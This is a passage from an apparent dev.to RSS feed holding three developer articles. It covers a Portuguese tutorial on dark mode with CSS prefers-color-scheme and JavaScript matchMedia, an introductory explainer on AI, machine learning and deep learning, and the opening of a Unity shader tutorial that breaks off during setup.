&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefers-color-scheme&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;light&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Abaixo tem uma página exemplo simples que eu fiz para demonstrar a utilização do recurso, você pode testar e ver como se ele comporta quando carregado em dispositivos com as diferentes configurações:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://codepen.io/caioc/pen/OJPqpyN"&gt;https://codepen.io/caioc/pen/OJPqpyN&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Uma maneira de simplificar a construção de temas inteiros é a utilização de variáveis, desta maneira, todos os lugares que você utilizar alguma cor, você coloca a variável que será alterada de acordo com as preferências do usuário, como mostrado em código abaixo:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="py"&gt;--color-background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="py"&gt;--color-text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="n"&gt;screen&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefers-color-scheme&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dark&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nd"&gt;:root&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="py"&gt;--color-background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="py"&gt;--color-text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;--color-background&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;--color-text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Assim você consegue construir folhas inteiras de CSS que irão alterar completamente o seu estilo de acordo com as variáveis que irão se alterar de acordo com o tema, simples e rápido 😁&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#javascript"&gt;
  &lt;/a&gt;
  JavaScript
&lt;/h2&gt;

&lt;p&gt;Outra abordagem plausível é utilizando JavaScript, desta vez iremos utilizar o window.matchMedia, com essa abordagem temos dois principais ganhos:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Dar poder ao usuário de alternar entre tema escuro e claro, a qualquer momento, e independente das configurações selecionadas em seu sistema operacional;&lt;/li&gt;
&lt;li&gt;Como mostrada na imagem abaixo, este recurso tem uma compatibilidade com um maior números de navegadores (desktop e mobiles), e atinge cerca de 93% de potenciais usuários, podendo chegar, dependendo de seu público, a 100% facilmente.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--obZJSErW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g5rxkm37vd1fmku3z9e1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--obZJSErW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/g5rxkm37vd1fmku3z9e1.png" alt="Can I Use" width="880" height="271"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Abaixo estou colocando um simples exemplo de como iremos utilizar o window.matchMedia em seu código JavaScript:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;matchMedia&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;matchMedia&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;(prefers-color-scheme: dark)&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;matches&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="c1"&gt;// darkMode&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Vale ressaltar que, dentro de sua condicional, é muito importante testar se o window.matchMedia exista de fato para que não ocorra um erro fatal em seu código que impossibilite o uso de quaisquer outro código JavaScript em sua página.&lt;/p&gt;

&lt;p&gt;Abaixo segue uma página simples que eu criei para mostrar um exemplo utilizando essa abordagem. Ele funciona da seguinte maneira: quando identifica que o modo escuro está ativo, uma classe darkMode é adicionada ao body da página, permitindo que, qualquer elemento seja alterado utilizando essa classe e, também existe um botão para você alternar entre dark e light mode a qualquer momento:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://codepen.io/caioc/pen/LYEaWGv"&gt;https://codepen.io/caioc/pen/LYEaWGv&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Você também pode utilizar esta opção para alterar algum elemento específico ao invés de uma classe mais geral, ai fica a critério do desenvolvedor no momento da construção.&lt;/p&gt;

&lt;p&gt;Outra facilidade que podemos incluir é um eventListener para que, quando o usuário altere as configurações em seus dispositivo/máquina, automaticamente o seu site/aplicação reflita o tema alterado também.&lt;/p&gt;

&lt;p&gt;Abaixo segue um código exemplo com eventListener que você pode adaptar para sua realidade:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;darkModeMatch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;matchMedia&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;matchMedia&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;(prefers-color-scheme: dark)&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;updateDarkMode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;darkModeMatch&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="nx"&gt;darkModeMatch&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addListener&lt;/span&gt;&lt;span class="p"&gt;(({&lt;/span&gt; &lt;span class="nx"&gt;matches&lt;/span&gt; &lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;matches&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;changeDarkMode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isDarkModeActive&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;isDarkModeActive&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;body&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;classList&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;darkMode&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;body&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;classList&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;darkMode&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nx"&gt;updateDarkMode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;changeDarkMode&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#finalizando"&gt;
  &lt;/a&gt;
  Finalizando
&lt;/h2&gt;

&lt;p&gt;Para finalizar o artigo, este é um recurso que vem sendo amplamente principalmente em aplicativos em dispositivos móveis, sendo assim, você deve considerar antes de implementar em seu site ou aplicação.&lt;/p&gt;

&lt;p&gt;Caso você tenha atividades que tenham um impacto nas funcionalidades para o seu usuário, talvez o modo escuro não deva ser priorizado por enquanto, sendo assim, procure implementar essa feature em algum momento que você esteja mais tranquilo no seu desenvolvimento.&lt;/p&gt;

&lt;p&gt;E você, já implementou isso em algum site ou aplicação? Deixe nos comentários o que você acha sobre esse recurso e como foi o resultado caso você já tenha implementado 😃&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>css</category>
      <category>webdev</category>
    </item>
    <item>
      <title>AI vs Machine Learning vs Deep Learning</title>
      <author>Matt Eland</author>
      <pubDate>Sun, 21 Nov 2021 23:30:11 +0000</pubDate>
      <link>https://dev.to/integerman/ai-vs-machine-learning-vs-deep-learning-4b4b</link>
      <guid>https://dev.to/integerman/ai-vs-machine-learning-vs-deep-learning-4b4b</guid>
      <description>&lt;p&gt;&lt;em&gt;Understanding the difference between Artificial Intelligence, Machine Learning, and Deep Learning&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let's talk about the difference between Artificial Intelligence, Machine Learning, and Deep Learning and their common applications. The three are related and solve related problems, but there are a few distinctions to be aware of.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This content is also available in video form on &lt;a href="https://www.youtube.com/watch?v=YrLEAsw5n6k"&gt;YouTube&lt;/a&gt;&lt;/em&gt;&lt;br&gt;
&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/YrLEAsw5n6k"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#artificial-intelligence-ai"&gt;
  &lt;/a&gt;
  Artificial Intelligence (AI)
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--yX0pLjfu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x2t0kyn4cd1yeixd1n3v.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--yX0pLjfu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/x2t0kyn4cd1yeixd1n3v.png" alt="Elements of Artificial Intelligence" width="640" height="534"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Artificial Intelligence, or AI, refers to &lt;em&gt;the capability for computers to emulate the decision-making processes of creatures (including humans)&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a broad category that encompasses everything in &lt;strong&gt;machine learning&lt;/strong&gt; and &lt;strong&gt;deep learning&lt;/strong&gt; while also adding a few other components.&lt;/p&gt;

&lt;p&gt;Things that are specific to artificial intelligence that are &lt;em&gt;not&lt;/em&gt; part of either machine learning or deep learning are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Chat bots&lt;/strong&gt; such as an automated support agent on a web page&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Decision Trees&lt;/strong&gt; and other forms of &lt;em&gt;rules-based logic&lt;/em&gt; that evaluate scenarios based on pre-defined rules&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Game AI&lt;/strong&gt; including pathfinding, behavior trees, goal-oriented action planning (GOAP), and other forms of decision-making&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Flocking&lt;/strong&gt; algorithms including ant algorithms and other forms of algorithms that emulate the movement of groups of animals&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These tasks are typically done via traditional programming techniques, though they may be heavily driven by external data such as that in a database or file.&lt;/p&gt;

&lt;p&gt;In addition to these things, everything inside of machine learning can be considered artificial intelligence.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#machine-learning-ml"&gt;
  &lt;/a&gt;
  Machine Learning (ML)
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--a7-xPskb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5piypo5oxz7v4kdli9n1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--a7-xPskb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5piypo5oxz7v4kdli9n1.png" alt="Elements of Machine Learning" width="645" height="534"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Machine learning is a subset of artificial intelligence. &lt;em&gt;Machine learning uses mathematical techniques to train a computer to classify, predict, or cluster values either with or without historical data to base these decisions on.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Machine learning typically falls into one of several buckets:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Regression&lt;/strong&gt; tasks involving predicting a numeric value such as a temperature, revenue total, or student grade.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Classification&lt;/strong&gt; tasks involving determining which of several categories something falls into.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Clustering&lt;/strong&gt; tasks involving identifying similarities in pieces of data and grouping things together without prior training.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Reinforcement learning&lt;/strong&gt; tasks involving computers learning to do things based on scored attempts without prior training.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Many different algorithms are used for machine learning and these are beyond the scope of this article though I hope to cover many of them on this blog in the future. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#neural-networks"&gt;
  &lt;/a&gt;
  Neural Networks
&lt;/h3&gt;

&lt;p&gt;It is worth noting that many machine learning algorithms involve &lt;em&gt;neural networks&lt;/em&gt; (also called "neural nets") that do mathematical calculations while mimicking the layered structure of the brain.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HWF10PNK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn61c416az0jva9k0ava.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HWF10PNK--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fn61c416az0jva9k0ava.png" alt="A Neural Net" width="131" height="164"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Neural networks are a network of simulated neurons that take in at least one input and result in an output. Neural nets use &lt;em&gt;hidden layers&lt;/em&gt; of neurons and weighted connections between each neuron to perform calculations. These weights numbers that get multiplied by the input to determine the output. The value of each weight is adjusted through machine learning training techniques that "coach" the network to produce an optimal output.&lt;/p&gt;

&lt;p&gt;There are many variations of neural networks and different &lt;em&gt;activation functions&lt;/em&gt; that can be specified to neural networks that change the way they behave, but at a general level they all take in inputs and produce outputs via weighted mathematical evaluation.&lt;/p&gt;

&lt;p&gt;Neural nets are powerful structures that can find hidden relationships in data, but it also becomes difficult to understand exactly &lt;em&gt;how&lt;/em&gt; they arrive at their decisions. This can result in a loss of transparency to both end-users and AI developers and can result in bias hiding in AI solutions if experiments are not carefully constructed.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#deep-learning"&gt;
  &lt;/a&gt;
  Deep Learning
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zsgw9BFM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0i177tp5wmarwzl3occ4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zsgw9BFM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/0i177tp5wmarwzl3occ4.png" alt="Deep Learning as a subset of Machine Learning" width="646" height="534"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Deep learning is a specialized form of machine learning (and artificial intelligence by extension) that involves neural networks of additional depth and complexity that they can come to more advanced solutions to the tasks they're given.&lt;/p&gt;

&lt;p&gt;This additional depth and complexity does have some downsides, however, as it often takes longer for these neural networks to be trained to solve a problem and it becomes harder to understand the generated neural networks they produce which increases some of the drawbacks related to transparency around neural networks.&lt;/p&gt;

&lt;p&gt;More advanced machine learning techniques don't formally &lt;em&gt;require&lt;/em&gt; deep learning, however they tend to take advantage of deep learning so I'm listing some types of them here:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Image Recognition&lt;/strong&gt; analyzing and interpreting images, including object recognition, facial analysis, and generating textual descriptions of images&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Text Analysis&lt;/strong&gt; including sentiment analysis, named entity extraction, key point extraction, and advanced language understanding&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Speech Recognition&lt;/strong&gt; including generating live captions from ongoing videos&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Speech Synthesis&lt;/strong&gt; - particularly for more natural human-like generation of human speech&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Language Translation&lt;/strong&gt; involving the dynamic translation from one language to another&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;There's obviously a lot to like about artificial intelligence, machine learning, and deep learning. This field is very deep and evolving constantly, but there's bound to be something for everyone interested in learning more and experimenting with these technologies.&lt;/p&gt;

&lt;p&gt;In future articles I'll go into depth on how to get started with these types of applications and highlight how to work effectively with each using Python and &lt;a href="https://azure.microsoft.com/en-us/overview/ai-platform/"&gt;the Azure AI Platform&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For now, know that artificial intelligence is incredibly powerful but is not as difficult to get started with as you might expect.&lt;/p&gt;

&lt;p&gt;Stay tuned and happy coding!&lt;/p&gt;

</description>
      <category>datascience</category>
      <category>machinelearning</category>
      <category>artificialintelligence</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Shenanigans with Shaders</title>
      <author>George Offley</author>
      <pubDate>Sun, 21 Nov 2021 23:22:52 +0000</pubDate>
      <link>https://dev.to/georgeoffley/shenanigans-with-shaders-3i97</link>
      <guid>https://dev.to/georgeoffley/shenanigans-with-shaders-3i97</guid>
      <description>&lt;h2&gt;
  &lt;a href="#table-of-contents"&gt;
  &lt;/a&gt;
  Table Of Contents
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shaders"&gt;Shaders&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#setup"&gt;Setup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shader_code"&gt;Shader Code&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#conslusion"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For those of you who love rabbit holes, learning graphics programming is a pretty deep one. There’s always some new thing to learn, there’s a bunch of different new languages and toolsets to know, and on top of all that, &lt;a href="https://www.youtube.com/watch?v=tt_gPXpx0eo&amp;amp;t=101s&amp;amp;ab_channel=SamwellTarly"&gt;there’s math&lt;/a&gt;. Like anything else in programming, you pick up momentum with each new thing you build, so I &lt;a href="https://github.com/Xibanya/ShaderTutorials"&gt;found a tutorial&lt;/a&gt; and started making shaders. I know very little about this. However, I’m writing what I’m learning, so don’t come for me if I’m off on anything. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#shaders"&gt;
  &lt;/a&gt;
  Shaders &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;A shader is a program that runs on the GPU as part of the &lt;a href="https://en.wikipedia.org/wiki/Graphics_pipeline"&gt;graphics pipeline&lt;/a&gt;. We’re going to focus primarily on shaders in Unity. There are other ways to tackle this, but Unity gives an easy setup to get started quickly. For the context of Unity, a shader is a small script containing logic and calculations for determining the colors of a pixel.&lt;/p&gt;

&lt;p&gt;In Unity, we create &lt;em&gt;shader objects&lt;/em&gt; which act as wrappers for our shader program. A shader object exists in a &lt;em&gt;shader asset&lt;/em&gt; which is just the script we are writing. Creating these in Unity allows for a great deal of freedom in what we make. What we’ll focus on is adding some basic functionality to a shader. We’ll be focusing on using &lt;a href="https://docs.unity3d.com/Manual/SL-Reference.html"&gt;&lt;em&gt;ShaderLab&lt;/em&gt;&lt;/a&gt; to create shaders.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#setup"&gt;
  &lt;/a&gt;
  Setup &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;The first thing to set yourself up making shaders in Unity is Unity. So &lt;a href="https://unity3d.com/get-unity/download"&gt;download it&lt;/a&gt;, and create a new project.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--d6EGPlkZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/new_scene.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--d6EGPlkZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/new_scene.png" alt="New Scene in Unity" width="880" height="487"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I won’t give a full rundown of Unity and the stuff you can do. I leave that to &lt;a href="https://learn.unity.com/"&gt;better minds&lt;/a&gt;. In the &lt;em&gt;Hierarchy Window&lt;/em&gt;, right-click and scroll to &lt;em&gt;3D Object&lt;/em&gt; and click whichever object grabs your fancy. I always pick sphere for testing stuff. Now we have a &lt;a href="https://en.wikipedia.org/wiki/Polygon_mesh"&gt;&lt;em&gt;3D Mesh&lt;/em&gt;&lt;/a&gt; on the screen that we can begin adding things to it. In the &lt;em&gt;Project Window&lt;/em&gt;, right-click on the word &lt;em&gt;Assets&lt;/em&gt; and create two new folders, &lt;em&gt;Materials&lt;/em&gt; and &lt;em&gt;Shaders&lt;/em&gt;. Double click into the Materials folder, right-click and Create is right at the top -&amp;gt; click Material. Materials are similar to skins we can apply to 3D objects. We will use this new material to add our new shader to the 3D Mesh. After that, drag our new material into the &lt;em&gt;Scene Window&lt;/em&gt; where our sphere is and onto the sphere we made. Now right-click our Shaders folder scroll to Create -&amp;gt; Shader -&amp;gt; Standard Surface Shader. Click the sphere in the Scene window to bring up the &lt;em&gt;Inspector Window&lt;/em&gt;. Finally, drag the shader file over to the inspector window with our sphere covered in our new material. We have just applied our shader to the materials. You should see this in the Inspector Window.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1hRhFMhw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/test_material.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1hRhFMhw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://georgeoffley-blog-images.s3.amazonaws.com/2021-11-21-shenanigans-in-shaders/test_material.png" alt="Test Material inspector window" width="277" height="616"&gt;&lt;/a&gt;&lt;/p&gt;

